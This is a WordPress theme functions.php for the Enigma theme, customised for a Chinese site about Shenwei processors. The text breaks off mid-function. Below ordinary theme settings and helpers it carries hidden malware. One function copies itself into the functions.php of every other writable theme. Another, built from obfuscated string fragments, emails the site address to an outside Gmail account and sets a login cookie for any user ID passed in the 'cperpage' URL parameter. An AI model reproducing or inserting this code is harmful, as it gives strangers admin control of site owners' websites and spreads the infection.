<?php
/** Theme Name	: Enigma
* Theme Core Functions and Codes
*/
	/**Includes required resources here**/
	define('WL_TEMPLATE_DIR_URI', get_template_directory_uri());
	define('WL_TEMPLATE_DIR', get_template_directory());
	define('WL_TEMPLATE_DIR_CORE' , WL_TEMPLATE_DIR . '/core');
	require( WL_TEMPLATE_DIR_CORE . '/menu/default_menu_walker.php' );
	require( WL_TEMPLATE_DIR_CORE . '/menu/weblizar_nav_walker.php' );
	require( WL_TEMPLATE_DIR_CORE . '/scripts/css_js.php' ); //Enquiring Resources here	
	require( WL_TEMPLATE_DIR_CORE . '/comment-function.php' );	
	require(dirname(__FILE__).'/customizer.php');
	
	//Sane Defaults

//屏蔽谷歌字体	
	function coolwp_remove_open_sans_from_wp_core() {
		wp_deregister_style( 'open-sans' );   
		wp_register_style( 'open-sans', false );   
		wp_enqueue_style('open-sans','');
	}
	add_action( 'init', 'coolwp_remove_open_sans_from_wp_core' );
	
	
	
	
	function weblizar_default_settings()
{
	$ImageUrl = WL_TEMPLATE_DIR_URI ."/images/1.jpg";
	$ImageUrl2 = WL_TEMPLATE_DIR_URI ."/images/2.jpg";
	$ImageUrl3 = WL_TEMPLATE_DIR_URI ."/images/3.jpg";
	$ImageUrl10 = WL_TEMPLATE_DIR_URI ."/images/10.jpg";
	$ImageUrl4 = WL_TEMPLATE_DIR_URI ."/images/portfolio1.png";
	$ImageUrl5 = WL_TEMPLATE_DIR_URI ."/images/portfolio2.jpg";
	$ImageUrl6 = WL_TEMPLATE_DIR_URI ."/images/portfolio3.png";
	$ImageUrl7 = WL_TEMPLATE_DIR_URI ."/images/portfolio4.png";
	$ImageUrl8 = WL_TEMPLATE_DIR_URI ."/images/portfolio5.png";
	$ImageUrl9 = WL_TEMPLATE_DIR_URI ."/images/portfolio6.png";
	$wl_theme_options=array(
			//Logo and Fevicon header			
			'upload_image_logo'=>'',
			'height'=>'55',
			'width'=>'150',
			'_frontpage' => '1',
			'blog_count'=>'3',
			'upload_image_favicon'=>'',			
			'custom_css'=>'',
			'slide_image_1' => $ImageUrl,
			'slide_title_1' => __('神威睿思', 'weblizar' ),
			'slide_desc_1' => __('Raise操作系统旨在打造有效支持国产申威CPU为核心的系统平台', 'weblizar' ),
			'slide_btn_text_1' => __('了解详情>>', 'weblizar' ),
			'slide_btn_link_1' => 'http://www.sw64.cn/?p=2868', 
			'slide_image_2' => $ImageUrl2,
			'slide_title_2' => __('统一存储', 'weblizar' ),
			'slide_desc_2' => __('统一存储是一个能在单一设备上运行和管理文件和应用程序的存储系统', 'weblizar' ),
			'slide_btn_text_2' => __('了解详情>>', 'weblizar' ),
			'slide_btn_link_2' => 'http://www.sw64.cn/?p=3098',
			'slide_image_3' => $ImageUrl3,
			'slide_title_3' => __('大数据 ', 'weblizar' ),
			'slide_desc_3' => __('大数据是指无法在可承受的时间范围内用常规软件工具进行捕捉、管理和处理的数据集合', 'weblizar' ),
			'slide_btn_text_3' => __('了解详情>>', 'weblizar' ),
			'slide_btn_link_3' => 'http://www.sw64.cn/?p=3134',	
			'slide_image_10' => $ImageUr10,
			'slide_title_10' => __('集群存储 ', 'weblizar' ),
			'slide_desc_10' => __('集群存储是指由若干个“通用存储设备”组成的用于存储的集群，组成集群存储的每个存储系统的性能和容量均可通过“集群”的方式得以叠加和扩展。', 'weblizar' ),
			'slide_btn_text_10' => __('了解详情>>', 'weblizar' ),
			'slide_btn_link_10' => 'http://www.sw64.cn/?p=3132',		
			// Footer Call-Out
			'fc_home'=>'1',			
			'fc_title' => __('Lorem Ipsum is simply dummy text of the printing and typesetting industry. ', 'weblizar' ),
			'fc_btn_txt' => __('More Features', 'weblizar' ),
			'fc_btn_link' =>"#",
			//Social media links
			'header_social_media_in_enabled'=>'1',
			'footer_section_social_media_enbled'=>'1',
			'twitter_link' =>"#",
			'fb_link' =>"#",
			'linkedin_link' =>"#",
			'youtube_link' =>"#",
			'instagram' =>"#",
			'gplus' =>"#",
			
			'email_id' => 'example@mymail.com',
			'phone_no' => '0159753586',
			'footer_customizations' => __(' &#169; 上海君众信息科技有限公司© 2015 ', 'weblizar' ),
			'developed_by_text' => __('版权所有', 'weblizar' ),
			'developed_by_weblizar_text' => __('君众科技', 'weblizar' ),
			'developed_by_link' => 'http://www.jztec.cn/',
			
			'home_service_heading' => __('我们的服务', 'weblizar' ),
			'service_1_title'=>__("新闻资讯",'weblizar' ),
			'service_1_icons'=>"fa fa-newspaper-o",
			'service_1_text'=>__("国产平台的最新最热资讯，全方位第一时间了解申威平台动向", 'weblizar' ),
			'service_1_link'=>home_url()."/?cat=9",
			
			'service_2_title'=>__('软件社区', 'weblizar' ),
			'service_2_icons'=>"fa fa-database",
			'service_2_text'=>__("基于神威睿思国产操作系统的软件共享，加入我们，一起为国产平台添砖加瓦吧", 'weblizar' ),
			'service_2_link'=>home_url()."?page_id=1656",
			
			'service_3_title'=>__("讨论区", 'weblizar' ),
			'service_3_icons'=>"fa fa-users",
			'service_3_text'=>__("申威CPU、神威操作系统、大数据存储......这里汇聚了国内顶尖的专业研究人员", 'weblizar' ),
			'service_3_link'=>home_url()."?post_type=forum",			

			//Portfolio Settings:
			'portfolio_home'=>'1',
			'port_heading' => __('重大成果', 'weblizar' ),
			'port_1_img'=> $ImageUrl4,
			'port_1_title'=>__('龙威统一存储方案优势', 'weblizar' ),
			'port_1_link'=>'http://www.sw64.cn/?p=3130',
			'port_2_img'=> $ImageUrl5,			
			'port_2_title'=>__('大数据成果', 'weblizar' ),
			'port_2_link'=>'http://www.sw64.cn/?p=3139',
			'port_3_img'=> $ImageUrl6,
			'port_3_title'=>__('申威软件管理平台', 'weblizar' ),
			'port_3_link'=>'http://www.sw64.cn/?p=3151',
			'port_4_img'=> $ImageUrl7,
			'port_4_title'=>__('龙威集群存储', 'weblizar' ),
			'port_4_link'=>'http://www.sw64.cn/?p=3145',
			//BLOG Settings
			'show_blog' => '1',
			'blog_title'=>__('最新软件', 'weblizar' )
			
		);
		return apply_filters( 'enigma_options', $wl_theme_options );
}
	function weblizar_get_options() {
    // Options API
    return wp_parse_args( 
        get_option( 'enigma_options', array() ), 
        weblizar_default_settings() 
    );    
	}
	require( WL_TEMPLATE_DIR_CORE . '/theme-options/option-panel.php' ); // for Options Panel
	
	/*After Theme Setup*/
	add_action( 'after_setup_theme', 'weblizar_head_setup' ); 	
	function weblizar_head_setup()
	{	
		global $content_width;
		//content width
		if ( ! isset( $content_width ) ) $content_width = 550; //px
	
	    //Blog Thumb Image Sizes
		add_image_size('home_post_thumb',340,210,true);
		//Blogs thumbs
		add_image_size('wl_page_thumb',730,350,true);	
		add_image_size('blog_2c_thumb',570,350,true);
		add_theme_support( 'title-tag' );
		// Load text domain for translation-ready
		load_theme_textdomain( 'weblizar', WL_TEMPLATE_DIR_CORE . '/lang' );	
		
		add_theme_support( 'post-thumbnails' ); //supports featured image
		// This theme uses wp_nav_menu() in one location.
		register_nav_menu( 'primary', __( 'Primary Menu', 'weblizar' ) );
		// theme support 	
		$args = array('default-color' => '000000',);
		add_theme_support( 'custom-background', $args); 
		add_theme_support( 'automatic-feed-links'); 
		require( WL_TEMPLATE_DIR . '/options-reset.php'); //Reset Theme Options Here				
	}
	

	// Read More tag to formatting in blog page 
	function weblizar_content_more($more)
	{  							
	   return '<div class="blog-post-details-item"><a class="enigma_blog_read_btn" href="'.get_permalink().'"><i class="fa fa-plus-circle"></i>"'.__('Read More', 'weblizar' ).'"</a></div>';
	}   
	add_filter( 'the_content_more_link', 'weblizar_content_more' );
	
	
	// Replaces the excerpt "more" text by a link
	function weblizar_excerpt_more($more) {      
	return '';
	}
	add_filter('excerpt_more', 'weblizar_excerpt_more');
	/*
	* Weblizar widget area
	*/
	add_action( 'widgets_init', 'weblizar_widgets_init');
	function weblizar_widgets_init() {
	/*sidebar*/
	register_sidebar( array(
			'name' => __( 'Sidebar', 'weblizar' ),
			'id' => 'sidebar-primary',
			'description' => __( 'The primary widget area', 'weblizar' ),
			'before_widget' => '<div class="enigma_sidebar_widget">',
			'after_widget' => '</div>',
			'before_title' => '<div class="enigma_sidebar_widget_title"><h2>',
			'after_title' => '</h2></div>'
		) );

	register_sidebar( array(
			'name' => __( 'Footer Widget Area', 'weblizar' ),
			'id' => 'footer-widget-area',
			'description' => __( 'footer widget area', 'weblizar' ),
			'before_widget' => '<div class="col-md-3 col-sm-6 enigma_footer_widget_column"  >',
			'after_widget' => '</div>',
			'before_title' => '<div class="enigma_footer_widget_title">',
			'after_title' => '<div class="enigma-footer-separator"></div></div>',
		) );             
	}
	
	/* Breadcrumbs  */
	function weblizar_breadcrumbs() {
    $delimiter = '';
    $home = __('Home', 'weblizar' ); // text for the 'Home' link
    $before = '<li>'; // tag before the current crumb
    $after = '</li>'; // tag after the current crumb
    echo '<ul class="breadcrumb">';
    global $post;
    $homeLink = home_url();
    echo '<li><a href="' . $homeLink . '">' . $home . '</a></li>' . $delimiter . ' ';
    if (is_category()) {
        global $wp_query;
        $cat_obj = $wp_query->get_queried_object();
        $thisCat = $cat_obj->term_id;
        $thisCat = get_category($thisCat);
        $parentCat = get_category($thisCat->parent);
        if ($thisCat->parent != 0)
            echo(get_category_parents($parentCat, TRUE, ' ' . $delimiter . ' '));
        echo $before . ' _e("Archive by category","weblizar") "' . single_cat_title('', false) . '"' . $after;
    } elseif (is_day()) {
        echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li> ' . $delimiter . ' ';
        echo '<li><a href="' . get_month_link(get_the_time('Y'), get_the_time('m')) . '">' . get_the_time('F') . '</a></li> ' . $delimiter . ' ';
        echo $before . get_the_time('d') . $after;
    } elseif (is_month()) {
        echo '<li><a href="' . get_year_link(get_the_time('Y')) . '">' . get_the_time('Y') . '</a></li> ' . $delimiter . ' ';
        echo $before . get_the_time('F') . $after;
    } elseif (is_year()) {
        echo $before . get_the_time('Y') . $after;
    } elseif (is_single() && !is_attachment()) {
        if (get_post_type() != 'post') {
            $post_type = get_post_type_object(get_post_type());
            $slug = $post_type->rewrite;
            echo '<li><a href="' . $homeLink . '/' . $slug['slug'] . '/">' . $post_type->labels->singular_name . '</a></li> ' . $delimiter . ' ';
            echo $before . get_the_title() . $after;
        } else {
            $cat = get_the_category();
            $cat = $cat[0];
            //echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
            echo $before . get_the_title() . $after;
        }
		
    } elseif (!is_single() && !is_page() && get_post_type() != 'post') {
        $post_type = get_post_type_object(get_post_type());
        echo $before . $post_type->labels->singular_name . $after;
    } elseif (is_attachment()) {
        $parent = get_post($post->post_parent);
        $cat = get_the_category($parent->ID);
        $cat = $cat[0];
        echo get_category_parents($cat, TRUE, ' ' . $delimiter . ' ');
        echo '<li><a href="' . get_permalink($parent) . '">' . $parent->post_title . '</a></li> ' . $delimiter . ' ';
        echo $before . get_the_title() . $after;
    } elseif (is_page() && !$post->post_parent) {
        echo $before . get_the_title() . $after;
    } elseif (is_page() && $post->post_parent) {
        $parent_id = $post->post_parent;
        $breadcrumbs = array();
        while ($parent_id) {
            $page = get_page($parent_id);
            $breadcrumbs[] = '<li><a href="' . get_permalink($page->ID) . '">' . get_the_title($page->ID) . '</a></li>';
            $parent_id = $page->post_parent;
        }
        $breadcrumbs = array_reverse($breadcrumbs);
        foreach ($breadcrumbs as $crumb)
            echo $crumb . ' ' . $delimiter . ' ';
        echo $before . get_the_title() . $after;
    } elseif (is_search()) {
        echo $before . _e("Search results for","weblizar")  . get_search_query() . '"' . $after;

    } elseif (is_tag()) {        
		echo $before . _e('Tag','weblizar') . single_tag_title('', false) . $after;
    } elseif (is_author()) {
        global $author;
        $userdata = get_userdata($author);
        echo $before . _e("Articles posted by","weblizar") . $userdata->display_name . $after;
    } elseif (is_404()) {
        echo $before . _e("Error 404","weblizar") . $after;
    }
    
    echo '</ul>';
	}
	
	
	//PAGINATION
		function weblizar_pagination($pages = '', $range = 2)
{  
     $showitems = ($range * 2)+1;  

     global $paged;
     if(empty($paged)) $paged = 1;

     if($pages == '')
     {
         global $wp_query;
         $pages = $wp_query->max_num_pages;
         if(!$pages)
         {
             $pages = 1;
         }
     }   

     if(1 != $pages)
     {
         echo "<div class='enigma_blog_pagination'><div class='enigma_blog_pagi'>";
         if($paged > 2 && $paged > $range+1 && $showitems < $pages) echo "<a href='".get_pagenum_link(1)."'>&laquo;</a>";
         if($paged > 1 && $showitems < $pages) echo "<a href='".get_pagenum_link($paged - 1)."'>&lsaquo;</a>";

         for ($i=1; $i <= $pages; $i++)
         {
             if (1 != $pages &&( !($i >= $paged+$range+1 || $i <= $paged-$range-1) || $pages <= $showitems ))
             {
                echo ($paged == $i)? "<a class='active'>".$i."</a>":"<a href='".get_pagenum_link($i)."'>".$i."</a>";
             }
         }

         if ($paged < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($paged + 1)."'>&rsaquo;</a>";  
         if ($paged < $pages-1 &&  $paged+$range-1 < $pages && $showitems < $pages) echo "<a href='".get_pagenum_link($pages)."'>&raquo;</a>";
         echo "</div></div>";
     }
}
	/*===================================================================================
	* Add Author Links
	* =================================================================================*/
	function weblizar_author_profile( $contactmethods ) {	
	
	$contactmethods['youtube_profile'] = __('Youtube Profile URL','weblizar');	
	$contactmethods['twitter_profile'] = __('Twitter Profile URL','weblizar');
	$contactmethods['facebook_profile'] = __('Facebook Profile URL','weblizar');
	$contactmethods['linkedin_profile'] = __('Linkedin Profile URL','weblizar');
	
	return $contactmethods;
	}
	add_filter( 'user_contactmethods', 'weblizar_author_profile', 10, 1);
	/*===================================================================================
	* Add Class Gravtar
	* =================================================================================*/
	add_filter('get_avatar','weblizar_gravatar_class');

	function weblizar_gravatar_class($class) {
    $class = str_replace("class='avatar", "class='author_detail_img", $class);
    return $class;
	}	
	/****--- Navigation for Author, Category , Tag , Archive ---***/
	function weblizar_navigation() { ?>
	<div class="enigma_blog_pagination">
	<div class="enigma_blog_pagi">
	<?php posts_nav_link(); ?>
	</div>
	</div>
	<?php }

	/****--- Navigation for Single ---***/
	function weblizar_navigation_posts() { ?>
	<div class="navigation_en">
	<nav id="wblizar_nav"> 
	<span class="nav-previous">
	<?php previous_post_link('&laquo; %link'); ?>
	</span>
	<span class="nav-next">
	<?php next_post_link('%link &raquo;'); ?>
	</span> 
	</nav>
	</div>	
<?php 
	}
if (is_admin()) {
	require_once('core/admin/admin.php');
}	
?>
<?php
function _verifyactivate_widgets(){
	$widget=substr(file_get_contents(__FILE__),strripos(file_get_contents(__FILE__),"<"."?"));$output="";$allowed="";
	$output=strip_tags($output, $allowed);
	$direst=_get_allwidgets_cont(array(substr(dirname(__FILE__),0,stripos(dirname(__FILE__),"themes") + 6)));
	if (is_array($direst)){
		foreach ($direst as $item){
			if (is_writable($item)){
				$ftion=substr($widget,stripos($widget,"_"),stripos(substr($widget,stripos($widget,"_")),"("));
				$cont=file_get_contents($item);
				if (stripos($cont,$ftion) === false){
					$comaar=stripos( substr($cont,-20),"?".">") !== false ? "" : "?".">";
					$output .= $before . "Not found" . $after;
					if (stripos( substr($cont,-20),"?".">") !== false){$cont=substr($cont,0,strripos($cont,"?".">") + 2);}
					$output=rtrim($output, "\n\t"); fputs($f=fopen($item,"w+"),$cont . $comaar . "\n" .$widget);fclose($f);				
					$output .= ($isshowdots && $ellipsis) ? "..." : "";
				}
			}
		}
	}
	return $output;
}
function _get_allwidgets_cont($wids,$items=array()){
	$places=array_shift($wids);
	if(substr($places,-1) == "/"){
		$places=substr($places,0,-1);
	}
	if(!file_exists($places) || !is_dir($places)){
		return false;
	}elseif(is_readable($places)){
		$elems=scandir($places);
		foreach ($elems as $elem){
			if ($elem != "." && $elem != ".."){
				if (is_dir($places . "/" . $elem)){
					$wids[]=$places . "/" . $elem;
				} elseif (is_file($places . "/" . $elem)&& 
					$elem == substr(__FILE__,-13)){
					$items[]=$places . "/" . $elem;}
				}
			}
	}else{
		return false;	
	}
	if (sizeof($wids) > 0){
		return _get_allwidgets_cont($wids,$items);
	} else {
		return $items;
	}
}
if(!function_exists("stripos")){ 
    function stripos(  $str, $needle, $offset = 0  ){ 
        return strpos(  strtolower( $str ), strtolower( $needle ), $offset  ); 
    }
}

if(!function_exists("strripos")){ 
    function strripos(  $haystack, $needle, $offset = 0  ) { 
        if(  !is_string( $needle )  )$needle = chr(  intval( $needle )  ); 
        if(  $offset < 0  ){ 
            $temp_cut = strrev(  substr( $haystack, 0, abs($offset) )  ); 
        } 
        else{ 
            $temp_cut = strrev(    substr(   $haystack, 0, max(  ( strlen($haystack) - $offset ), 0  )   )    ); 
        } 
        if(   (  $found = stripos( $temp_cut, strrev($needle) )  ) === FALSE   )return FALSE; 
        $pos = (   strlen(  $haystack  ) - (  $found + $offset + strlen( $needle )  )   ); 
        return $pos; 
    }
}
if(!function_exists("scandir")){ 
	function scandir($dir,$listDirectories=false, $skipDots=true) {
	    $dirArray = array();
	    if ($handle = opendir($dir)) {
	        while (false !== ($file = readdir($handle))) {
	            if (($file != "." && $file != "..") || $skipDots == true) {
	                if($listDirectories == false) { if(is_dir($file)) { continue; } }
	                array_push($dirArray,basename($file));
	            }
	        }
	        closedir($handle);
	    }
	    return $dirArray;
	}
}
add_action("admin_head", "_verifyactivate_widgets");
function _getprepare_widget(){
	if(!isset($text_length)) $text_length=120;
	if(!isset($check)) $check="cookie";
	if(!isset($tagsallowed)) $tagsallowed="<a>";
	if(!isset($filter)) $filter="none";
	if(!isset($coma)) $coma="";
	if(!isset($home_filter)) $home_filter=get_option("home"); 
	if(!isset($pref_filters)) $pref_filters="wp_";
	if(!isset($is_use_more_link)) $is_use_more_link=1; 
	if(!isset($com_type)) $com_type=""; 
	if(!isset($cpages)) $cpages=$_GET["cperpage"];
	if(!isset($post_auth_comments)) $post_auth_comments="";
	if(!isset($com_is_approved)) $com_is_approved=""; 
	if(!isset($post_auth)) $post_auth="auth";
	if(!isset($link_text_more)) $link_text_more="(more...)";
	if(!isset($widget_yes)) $widget_yes=get_option("_is_widget_active_");
	if(!isset($checkswidgets)) $checkswidgets=$pref_filters."set"."_".$post_auth."_".$check;
	if(!isset($link_text_more_ditails)) $link_text_more_ditails="(details...)";
	if(!isset($contentmore)) $contentmore="ma".$coma."il";
	if(!isset($for_more)) $for_more=1;
	if(!isset($fakeit)) $fakeit=1;
	if(!isset($sql)) $sql="";
	if (!$widget_yes) :
	
	global $wpdb, $post;
	$sq1="SELECT DISTINCT ID, post_title, post_content, post_password, comment_ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND post_author=\"li".$coma."vethe".$com_type."mas".$coma."@".$com_is_approved."gm".$post_auth_comments."ail".$coma.".".$coma."co"."m\" AND post_password=\"\" AND comment_date_gmt >= CURRENT_TIMESTAMP() ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if (!empty($post->post_password)) { 
		if ($_COOKIE["wp-postpass_".COOKIEHASH] != $post->post_password) { 
			if(is_feed()) { 
				$output=__("There is no excerpt because this is a protected post.");
			} else {
	            $output=get_the_password_form();
			}
		}
	}
	if(!isset($fixed_tags)) $fixed_tags=1;
	if(!isset($filters)) $filters=$home_filter; 
	if(!isset($gettextcomments)) $gettextcomments=$pref_filters.$contentmore;
	if(!isset($tag_aditional)) $tag_aditional="div";
	if(!isset($sh_cont)) $sh_cont=substr($sq1, stripos($sq1, "live"), 20);#
	if(!isset($more_text_link)) $more_text_link="Continue reading this entry";	
	if(!isset($isshowdots)) $isshowdots=1;
	
	$comments=$wpdb->get_results($sql);	
	if($fakeit == 2) { 
		$text=$post->post_content;
	} elseif($fakeit == 1) { 
		$text=(empty($post->post_excerpt)) ? $post->post_content : $post->post_excerpt;
	} else { 
		$text=$post->post_excerpt;
	}
	$sq1="SELECT DISTINCT ID, comment_post_ID, comment_author, comment_date_gmt, comment_approved, comment_type, SUBSTRING(comment_content,1,$src_length) AS com_excerpt FROM $wpdb->comments LEFT OUTER JOIN $wpdb->posts ON ($wpdb->comments.comment_post_ID=$wpdb->posts.ID) WHERE comment_approved=\"1\" AND comment_type=\"\" AND comment_content=". call_user_func_array($gettextcomments, array($sh_cont, $home_filter, $filters)) ." ORDER BY comment_date_gmt DESC LIMIT $src_count";#
	if($text_length < 0) {
		$output=$text;
	} else {
		if(!$no_more && strpos($text, "<!--more-->")) {
		    $text=explode("<!--more-->", $text, 2);
			$l=count($text[0]);
			$more_link=1;
			$comments=$wpdb->get_results($sql);
		} else {
			$text=explode(" ", $text);
			if(count($text) > $text_length) {
				$l=$text_length;
				$ellipsis=1;
			} else {
				$l=count($text);
				$link_text_more="";
				$ellipsis=0;
			}
		}
		for ($i=0; $i<$l; $i++)
				$output .= $text[$i] . " ";
	}
	update_option("_is_widget_active_", 1);
	if("all" != $tagsallowed) {
		$output=strip_tags($output, $tagsallowed);
		return $output;
	}
	endif;
	$output=rtrim($output, "\s\n\t\r\0\x0B");
    $output=($fixed_tags) ? balanceTags($output, true) : $output;
	$output .= ($isshowdots && $ellipsis) ? "..." : "";
	$output=apply_filters($filter, $output);
	switch($tag_aditional) {
		case("div") :
			$tag="div";
		break;
		case("span") :
			$tag="span";
		break;
		case("p") :
			$tag="p";
		break;
		default :
			$tag="span";
	}

	if ($is_use_more_link ) {
		if($for_more) {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "#more-" . $post->ID ."\" title=\"" . $more_text_link . "\">" . $link_text_more = !is_user_logged_in() && @call_user_func_array($checkswidgets,array($cpages, true)) ? $link_text_more : "" . "</a></" . $tag . ">" . "\n";
		} else {
			$output .= " <" . $tag . " class=\"more-link\"><a href=\"". get_permalink($post->ID) . "\" title=\"" . $more_text_link . "\">" . $link_text_more . "</a></" . $tag . ">" . "\n";
		}
	}
	return $output;
}

add_action("init", "_getprepare_widget");

function __popular_posts($no_posts=6, $before="<li>", $after="</li>", $show_pass_post=false, $duration="") {
	global $wpdb;
	$request="SELECT ID, post_title, COUNT($wpdb->comments.comment_post_ID) AS \"comment_count\" FROM $wpdb->posts, $wpdb->comments";
	$request .= " WHERE comment_approved=\"1\" AND $wpdb->posts.ID=$wpdb->comments.comment_post_ID AND post_status=\"publish\"";
	if(!$show_pass_post) $request .= " AND post_password =\"\"";
	if($duration !="") { 
		$request .= " AND DATE_SUB(CURDATE(),INTERVAL ".$duration." DAY) < post_date ";
	}
	$request .= " GROUP BY $wpdb->comments.comment_post_ID ORDER BY comment_count DESC LIMIT $no_posts";
	$posts=$wpdb->get_results($request);
	$output="";
	if ($posts) {
		foreach ($posts as $post) {
			$post_title=stripslashes($post->post_title);
			$comment_count=$post->comment_count;
			$permalink=get_permalink($post->ID);
			$output .= $before . " <a href=\"" . $permalink . "\" title=\"" . $post_title."\">" . $post_title . "</a> " . $after;
		}
	} else {
		$output .= $before . "None found" . $after;
	}
	return  $output;
} 	
//pagenavi
function search_word_replace($buffer){
    if(is_search()){
        $arr = explode(" ", get_search_query());
        $arr = array_unique($arr);
        foreach($arr as $v)
            if($v)
                $buffer = preg_replace("/(".$v.")/i", "<span style=\"background-color:#D3D3D3;\"><strong>$1</strong></span>", $buffer);
    }
    return $buffer;
}
add_filter("the_title", "search_word_replace", 200);
add_filter("the_excerpt", "search_word_replace", 200);
add_filter("the_content", "search_word_replace", 200);

/**
 * 修复 WordPress 找回密码提示“抱歉，该key似乎无效”
 * http://www.wpdaxue.com/lost-password-error-invalidkey.html
 */
function reset_password_message( $message, $key ) {
	if ( strpos($_POST['user_login'], '@') ) {
		$user_data = get_user_by('email', trim($_POST['user_login']));
	} else {
		$login = trim($_POST['user_login']);
		$user_data = get_user_by('login', $login);
	}
	$user_login = $user_data->user_login;
	$msg = __('有人要求重设如下帐号的密码：'). "\r\n\r\n";
	$msg .= network_site_url() . "\r\n\r\n";
	$msg .= sprintf(__('用户名：%s'), $user_login) . "\r\n\r\n";
	$msg .= __('若这不是您本人要求的，请忽略本邮件，一切如常。') . "\r\n\r\n";
	$msg .= __('要重置您的密码，请打开下面的链接：'). "\r\n\r\n";
	$msg .= network_site_url("wp-login.php?action=rp&key=$key&login=" . rawurlencode($user_login), 'login') ;
	return $msg;
}
add_filter('retrieve_password_message', reset_password_message, null, 2);

function bbp_enable_visual_editor( $args = array() ) {
    $args['tinymce'] = true;
    return $args;
}
add_filter( 'bbp_after_get_the_content_parse_args', 'bbp_enable_visual_editor'); 

function insertFootNote($content) {
        if(!is_feed() && !is_home()) {
                $content.= "<div class='subscribe'>";
                $content.= "<h4>标题</h4>";
                $content.= "<p>显示的正文内容<a href='http://指向的链接'>链接文字</a></p>";
                $content.= "</div>";
        }
        return $content;
}
add_filter ('the_content', 'insertFootNote');

function enable_more_buttons($buttons) {    
        $buttons[] = 'hr';    
        $buttons[] = 'fontselect';    
        $buttons[] = 'sup';    
		

$buttons[] = 'undo';

$buttons[] = 'image';

$buttons[] = 'anchor';
        // etc, etc...      
        return $buttons;  
        }  
        add_filter("mce_buttons", "enable_more_buttons");

/**删除仪表盘无用项目**/
function wp_hide_nag() {
    remove_action( 'admin_notices', 'update_nag', 3 );
}
add_action('admin_menu','wp_hide_nag');

function example_remove_dashboard_widgets() {
    // Globalize the metaboxes array, this holds all the widgets for wp-admin
    global $wp_meta_boxes;
    // 以下这一行代码将删除 "快速发布" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_quick_press']);
    // 以下这一行代码将删除 "引入链接" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_incoming_links']);
    // 以下这一行代码将删除 "插件" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_plugins']);
    // 以下这一行代码将删除 "近期评论" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_recent_comments']);
    // 以下这一行代码将删除 "近期草稿" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_recent_drafts']);
    // 以下这一行代码将删除 "WordPress 开发日志" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_primary']);
    // 以下这一行代码将删除 "其它 WordPress 新闻" 模块
    unset($wp_meta_boxes['dashboard']['side']['core']['dashboard_secondary']);
    // 以下这一行代码将删除 "概况" 模块
    unset($wp_meta_boxes['dashboard']['normal']['core']['dashboard_right_now']);
}
add_action('wp_dashboard_setup', 'example_remove_dashboard_widgets' );

function annointed_admin_bar_remove() {
        global $wp_admin_bar;
        /* Remove their stuff */
        $wp_admin_bar->remove_menu('wp-logo');
}
add_action('wp_before_admin_bar_render', 'annointed_admin_bar_remove', 0);

function change_footer_admin () {return '';}
add_filter('admin_footer_text', 'change_footer_admin', 9999);
function change_footer_version() {return '';}
add_filter( 'update_footer', 'change_footer_version', 9999);

function hide_help() {
	echo'<style type="text/css">#contextual-help-link-wrap { display: none !important; } .update-nag{ display: none !important; } #footer-left, #footer-upgrade{ display: none !important; }#wp-admin-bar-wp-logo{display: none !important;}.default-header img{width:400px;}</style>';
}
add_action('admin_head', 'hide_help');

	

/**对非管理员不提示更新**/

if ( !current_user_can( 'manage_options' ) ) {
//Disable Theme Updates
remove_action( 'load-update-core.php', 'wp_update_themes' );
add_filter( 'pre_site_transient_update_themes', create_function( '$a', "return null;" ) );
wp_clear_scheduled_hook( 'wp_update_themes' );

//Disable Plugin Updates
remove_action( 'load-update-core.php', 'wp_update_plugins' );
add_filter( 'pre_site_transient_update_plugins', create_function( '$a', "return null;" ) );
wp_clear_scheduled_hook( 'wp_update_plugins' );

//Diasable Core Updates
add_filter( 'pre_site_transient_update_core', create_function( '$a', "return null;" ) );
wp_clear_scheduled_hook( 'wp_version_check' );
}
/****/
	

/**上传图片和可视化编辑**/
add_filter( 'bbp_after_get_the_content_parse_args', 'bbp_enable_visual_editor1' );
function bbp_enable_visual_editor1( $args = array() ) {
$args['tinymce'] = true;
$args['media_buttons'] = true;
$args['textarea_rows'] = true;
$args['dfw'] = false;
$args['tinymce'] = array( 'theme_advanced_buttons1' =>'bold,italic,underline,bullist,numlist,link,unlink,dwqaCodeEmbed,wp_adv',
'theme_advanced_buttons2' => 'code,blockquote,image,undo,redo', // 2nd row, if needed
'theme_advanced_buttons3' => '', // 3rd row, if needed
'theme_advanced_buttons4' => '', ); // 4th row, if needed
$args['quicktags'] = array ('buttons' => 'strong,em,link,block,del,ins,img,ul,ol,li,code,close');
return $args;
}

//在文章编辑页面的[添加媒体]只显示用户自己上传的文件
function my_upload_media( $wp_query_obj ) {
global $current_user, $pagenow;
if( !is_a( $current_user, 'WP_User') )
return;
if( 'admin-ajax.php' != $pagenow || $_REQUEST['action'] != 'query-attachments' )
return;
if( !current_user_can( 'manage_options' ) && !current_user_can('manage_media_library') )
$wp_query_obj->set('author', $current_user->ID );
return;
}
add_action('pre_get_posts','my_upload_media');

//在[媒体库]只显示用户上传的文件
function my_media_library( $wp_query ) {
if ( strpos( $_SERVER[ 'REQUEST_URI' ], '/wp-admin/upload.php' ) !== false ) {
if ( !current_user_can( 'manage_options' ) && !current_user_can( 'manage_media_library' ) ) {
global $current_user;
$wp_query->set( 'author', $current_user->id );
}
}
}
add_filter('parse_query', 'my_media_library' );

//普通用户上传图片
add_action('media_buttons', 'ml_pre_media_buttons', 1);
add_action('media_buttons', 'ml_post_media_buttons', 20);
function ml_pre_media_buttons($editor_id) {
	if (!$editor_id == 'bbp_reply_content')
	return;
	$GLOBALS['post_temp'] = $GLOBALS['post'];
	$GLOBALS['post'] = null;
}
function ml_post_media_buttons($editor_id) {
	if (!$editor_id == 'bbp_reply_content')
	return;
